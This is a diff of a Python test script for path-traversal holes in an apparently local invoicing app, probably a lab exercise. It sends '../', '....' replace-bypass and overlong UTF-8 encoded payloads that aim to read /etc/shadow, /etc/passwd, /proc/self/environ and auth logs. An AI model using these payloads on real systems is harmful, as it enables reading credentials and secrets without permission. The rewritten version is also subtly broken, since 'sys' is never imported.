@@ -1,131 +1,125 @@
-#!/usr/bin/env python3
+import unittest
 import requests
-import urllib.parse
-import sys
-import traceback
+import os
+from dotenv import load_dotenv
 
-# Configuration
-BASE_URL = "http://10.0.0.105:3001"  # Docker host IP
-TIMEOUT = 3  # seconds
+# Load environment variables
+load_dotenv()
 
-LINUX_TARGETS = [
-    "/etc/passwd",
-    "/etc/shadow",
-    "/proc/self/environ",
-    "/var/log/auth.log"
-]
+# Configuration from environment
+API_URL = os.getenv('API_URL', 'http://localhost:3001')
 
-def make_request(url, params=None):
-    """Make a request with timeout and error handling"""
-    try:
-        print(f"\n[DEBUG] Requesting: {url} with params {params}")
-        r = requests.get(url, params=params, timeout=TIMEOUT)
-        print(f"[DEBUG] Response status: {r.status_code}")
-        return r
-    except requests.exceptions.Timeout:
-        print(f"[ERROR] Request timed out: {url}")
-        return None
-    except requests.exceptions.RequestException as e:
-        print(f"[ERROR] Request failed: {e}")
-        return None
-
-def test_simple_path_traversal():
-    """Test simple path traversal using path.join"""
-    print("\n[+] Testing Simple Path Traversal")
-    endpoint = f"{BASE_URL}/api/file/read"
+class PathTraversalTest(unittest.TestCase):
+    """Test cases for path traversal vulnerabilities."""
     
-    # Test accessing test.txt (should work)
-    r = make_request(endpoint, {"file": "test.txt"})
-    if not r:
-        print("[-] Failed to access test.txt")
-        return
-    print(f"[*] Accessing test.txt: {r.status_code}")
-    if r.status_code == 200:
-        print(f"[*] Content: {r.text.strip()}")
-
-    # Test path traversal
-    for target in LINUX_TARGETS[:1]:  # Test only first target for now
-        traversal = "../" * 10 + target.lstrip("/")
-        r = make_request(endpoint, {"file": traversal})
-        if not r:
-            print(f"[-] Failed to test traversal for {target}")
-            continue
-        print(f"\n[*] Trying to access {target}")
-        print(f"[*] Status: {r.status_code}")
-        if r.status_code == 200:
-            print(f"[*] First few lines:\n{r.text[:200]}")
-
-def test_bypass_replace():
-    """Test path traversal with '../' replacement bypass"""
-    print("\n[+] Testing Bypass Replace Vulnerability")
-    endpoint = f"{BASE_URL}/api/file/secure-read"
+    WINDOWS_TARGETS = [
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "C:\\Windows\\win.ini",
+        "C:\\Users\\Administrator\\Desktop\\flag.txt"
+    ]
     
-    for target in LINUX_TARGETS[:1]:  # Test only first target for now
-        traversal = "...." * 10 + target.lstrip("/")
-        r = make_request(endpoint, {"filename": traversal})
-        if not r:
-            print(f"[-] Failed to test bypass for {target}")
-            continue
-        print(f"\n[*] Trying to access {target}")
-        print(f"[*] Status: {r.status_code}")
-        if r.status_code == 200:
-            print(f"[*] First few lines:\n{r.text[:200]}")
-
-def test_template_traversal():
-    """Test path traversal in template loading"""
-    print("\n[+] Testing Template Path Traversal")
-    endpoint = f"{BASE_URL}/api/file/template"
+    LINUX_TARGETS = [
+        "/etc/passwd",
+        "/etc/shadow",
+        "/proc/self/environ",
+        "/var/log/auth.log"
+    ]
     
-    # Test accessing invoice.html (should work)
-    r = make_request(endpoint, {"template": "invoice.html"})
-    if not r:
-        print("[-] Failed to access invoice.html")
-        return
-    print(f"[*] Accessing invoice.html: {r.status_code}")
-    if r.status_code == 200:
-        print(f"[*] Content: {r.text[:200]}")
-
-    # Test path traversal
-    for target in LINUX_TARGETS[:1]:  # Test only first target for now
-        traversal = "../" * 5 + target.lstrip("/")
-        r = make_request(endpoint, {"template": traversal})
-        if not r:
-            print(f"[-] Failed to test template traversal for {target}")
-            continue
-        print(f"\n[*] Trying to access {target}")
-        print(f"[*] Status: {r.status_code}")
-        if r.status_code == 200:
-            print(f"[*] First few lines:\n{r.text[:200]}")
+    def test_01_simple_path_traversal(self):
+        """Test simple path traversal using path.join"""
+        endpoint = f"{API_URL}/api/file/read"
+        
+        # Test accessing test.txt (should work)
+        params = {"file": "test.txt"}
+        response = requests.get(endpoint, params=params)
+        self.assertEqual(response.status_code, 200, "Could not access test.txt")
+        
+        # Test path traversal
+        for target in self.LINUX_TARGETS:  # Container is Linux
+            traversal = "../" * 10 + target.lstrip("/")
+            params = {"file": traversal}
+            response = requests.get(endpoint, params=params)
+            print(f"\n[*] Trying to access {target}")
+            print(f"[*] Status: {response.status_code}")
+            if response.status_code == 200:
+                print(f"[*] First few lines:\n{response.text[:200]}")
+            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")
+    
+    def test_02_bypass_replace(self):
+        """Test path traversal with '../' replacement bypass"""
+        endpoint = f"{API_URL}/api/file/secure-read"
+        
+        for target in self.LINUX_TARGETS:
+            # Use '....' which becomes '../' after replace
+            traversal = "...." * 10 + target.lstrip("/")
+            params = {"filename": traversal}
+            response = requests.get(endpoint, params=params)
+            print(f"\n[*] Trying to access {target}")
+            print(f"[*] Status: {response.status_code}")
+            if response.status_code == 200:
+                print(f"[*] First few lines:\n{response.text[:200]}")
+            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")
+    
+    def test_03_template_traversal(self):
+        """Test path traversal in template loading"""
+        endpoint = f"{API_URL}/api/file/template"
+        
+        # Test accessing invoice.html (should work)
+        params = {"template": "invoice.html"}
+        response = requests.get(endpoint, params=params)
+        self.assertEqual(response.status_code, 200, "Could not access invoice.html")
+        
+        # Test path traversal
+        for target in self.LINUX_TARGETS:
+            traversal = "../" * 5 + target.lstrip("/")  # Fewer ../ needed as we start in templates/
+            params = {"template": traversal}
+            response = requests.get(endpoint, params=params)
+            print(f"\n[*] Trying to access {target}")
+            print(f"[*] Status: {response.status_code}")
+            if response.status_code == 200:
+                print(f"[*] First few lines:\n{response.text[:200]}")
+            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")
+    
+    def test_04_unicode_bypass(self):
+        """Test path traversal with Unicode bypass"""
+        endpoint = f"{API_URL}/api/file/read"
+        
+        for target in self.LINUX_TARGETS:
+            # Use Unicode encoded '../'
+            traversal = "%c0%ae%c0%ae%c0%af" * 5 + target.lstrip("/")
+            params = {"file": traversal}
+            response = requests.get(endpoint, params=params)
+            print(f"\n[*] Trying to access {target} with Unicode bypass")
+            print(f"[*] Status: {response.status_code}")
+            if response.status_code == 200:
+                print(f"[*] First few lines:\n{response.text[:200]}")
+            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")
 
 def main():
-    print("[+] Path Traversal Vulnerability Tests")
-    print("[+] Target: Fusion.js Invoicer App")
+    """Run path traversal vulnerability tests."""
+    parser = argparse.ArgumentParser(description='Run path traversal vulnerability tests.')
+    parser.add_argument('--test', '-t', help='Run a specific test (e.g. test_01_simple_path_traversal)')
+    parser.add_argument('--list', '-l', action='store_true', help='List available tests')
+    args = parser.parse_args()
     
-    try:
-        # Test basic connectivity
-        print("[*] Testing basic connectivity...")
-        r = make_request(f"{BASE_URL}/api/file/read", {"file": "test.txt"})
-        if not r:
-            print("[-] Cannot connect to application")
-            return
-        if r.status_code != 200:
-            print(f"[-] Application returned status {r.status_code}")
-            return
-        
-        # Run tests one by one
-        test_simple_path_traversal()
-        print("\n[*] Press Enter to continue with bypass test...")
-        input()
-        test_bypass_replace()
-        print("\n[*] Press Enter to continue with template test...")
-        input()
-        test_template_traversal()
-        
-    except KeyboardInterrupt:
-        print("\n[-] Test interrupted by user")
-    except Exception as e:
-        print(f"[-] Unexpected error: {e}")
-        traceback.print_exc()
+    if args.list:
+        print("\nAvailable path traversal tests:")
+        for name in dir(PathTraversalTest):
+            if name.startswith('test_'):
+                print(f"  {name}")
+        return 0
+    
+    if args.test:
+        # Run specific test
+        suite = unittest.TestLoader().loadTestsFromName(args.test, PathTraversalTest)
+    else:
+        # Run all tests
+        suite = unittest.TestLoader().loadTestsFromTestCase(PathTraversalTest)
+    
+    runner = unittest.TextTestRunner(verbosity=2)
+    result = runner.run(suite)
+    return 0 if result.wasSuccessful() else 1
 
 if __name__ == "__main__":
-    main() 
+    import argparse
+    sys.exit(main()) 
